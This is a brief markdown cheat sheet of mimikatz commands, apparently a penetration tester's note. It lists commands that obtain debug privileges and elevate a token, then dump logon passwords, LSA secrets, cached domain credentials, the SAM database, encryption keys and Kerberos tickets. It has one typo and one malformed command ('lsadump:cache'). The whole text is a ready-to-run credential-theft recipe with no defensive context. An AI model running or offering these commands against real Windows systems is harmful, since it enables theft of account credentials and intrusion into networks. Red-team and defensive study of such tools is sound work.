# mimikatz

```
# Recommended to run in elevated access
privilege::debug
token::elevate

# sump passwords
sekurlsa::logonpasswords

# Dump secrets
lsadump::secrets

# dump msCacheV2
lsadump:cache

# dump tickets
sekurlsa::tickets

# dump sam
lsadump::sam

# kerberos export
kerberos::list /export

# dump ekeys
sekurlsa::ekeys

```
